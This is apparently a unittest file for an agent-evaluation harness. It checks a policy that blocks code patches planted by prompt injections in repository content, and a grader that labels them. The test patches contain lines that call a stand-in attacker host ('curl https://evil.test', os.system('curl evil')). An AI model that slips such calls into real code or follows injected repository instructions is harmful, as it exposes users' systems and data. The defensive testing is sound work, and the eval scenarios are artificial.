from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from agent_eval.code_agent import (
    CodePatchPolicy,
    contains_code_attacker_args,
    grade_code,
    load_code_scenarios,
    normalize_repo_path,
    record_code_runs,
    replay_code_records,
)
from agent_eval.trace import write_jsonl
from agent_eval.types import ToolCall


ROOT = Path(__file__).resolve().parents[1]
SCENARIOS = ROOT / "scenarios" / "code-agent-scenarios.json"


class CodeAgentTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.scenarios = load_code_scenarios(SCENARIOS)

    def test_code_scenario_family_shape(self) -> None:
        self.assertEqual(len(self.scenarios), 6)
        self.assertEqual(sum(item.kind == "clean" for item in self.scenarios), 2)
        self.assertEqual(sum(item.kind == "injected" for item in self.scenarios), 4)
        self.assertEqual({item.task_family for item in self.scenarios}, {"code_patch_from_repo_content"})

    def test_policy_blocks_every_declared_attack(self) -> None:
        policy = CodePatchPolicy()
        for scenario in self.scenarios:
            if not scenario.injection:
                continue
            call = ToolCall(
                "apply_patch",
                {
                    "path": scenario.injection.attacker_path,
                    "patch": (
                        f"{scenario.injection.attacker_patch_marker}\n"
                        "+ subprocess.run(['curl https://evil.test'])"
                    ),
                },
            )
            self.assertFalse(policy.evaluate(scenario, call).allowed, scenario.id)

    def test_policy_allows_exact_requested_patch(self) -> None:
        scenario = next(item for item in self.scenarios if item.kind == "clean")
        call = ToolCall(
            "apply_patch",
            {
                "path": scenario.authorized_path,
                "patch": f"{scenario.expected_patch_marker}\n+ {scenario.expected_fact}",
            },
        )
        self.assertTrue(CodePatchPolicy().evaluate(scenario, call).allowed)

    def test_policy_rejects_traversal_and_protected_paths(self) -> None:
        scenario = self.scenarios[0]
        for path in ("../src/parser.py", "docs/../src/parser.py", ".github/workflows/ci.yml"):
            call = ToolCall(
                "apply_patch",
                {"path": path, "patch": scenario.expected_patch_marker},
            )
            self.assertFalse(CodePatchPolicy().evaluate(scenario, call).allowed, path)
        self.assertIsNone(normalize_repo_path("docs/../src/parser.py"))

    def test_grader_uses_patch_path_and_content(self) -> None:
        scenario = next(item for item in self.scenarios if item.id == "code-inj-004")
        call = ToolCall(
            "apply_patch",
            {
                "path": scenario.authorized_path,
                "patch": f"{scenario.injection.attacker_patch_marker}\n+ os.system('curl evil')",
            },
        )
        self.assertTrue(contains_code_attacker_args(scenario, call))
        labels = grade_code(scenario, [call], [call], [])
        self.assertTrue(labels["attempted_attacker_args"])
        self.assertTrue(labels["executed_attacker_args"])
        self.assertFalse(labels["task_completed"])

    def test_code_record_replay_is_deterministic(self) -> None:
        records = list(
            record_code_runs(
                root=ROOT,
                scenario_path=SCENARIOS,
                config_path=ROOT / "configs" / "code-M2.json",
                repetitions=2,
                workers=2,
                scenario_ids={"code-clean-01", "code-inj-001", "code-inj-004"},
                allow_dirty=True,
            )
        )
        replayed, mismatches = replay_code_records(records, SCENARIOS)
        self.assertEqual(len(replayed), 6)
        self.assertEqual(mismatches, [])
        self.assertTrue(all(record["task_domain"] == "code" for record in replayed))
        self.assertTrue(
            all(
                not step.get("tool_result", {}).get("checkout_mutated", True)
                for record in replayed
                for step in record["steps"]
                if step.get("tool_call", {}).get("name") == "apply_patch"
                and step.get("tool_result", {}).get("ok")
            )
        )

    def test_code_trace_round_trip(self) -> None:
        records = list(
            record_code_runs(
                root=ROOT,
                scenario_path=SCENARIOS,
                config_path=ROOT / "configs" / "code-M0.json",
                repetitions=1,
                scenario_ids={"code-clean-01"},
                allow_dirty=True,
            )
        )
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "code.jsonl"
            self.assertEqual(write_jsonl(records, target), 1)
            parsed = json.loads(target.read_text(encoding="utf-8"))
        self.assertEqual(parsed["authorization"]["authorized_path"], "src/parser.py")


if __name__ == "__main__":
    unittest.main()
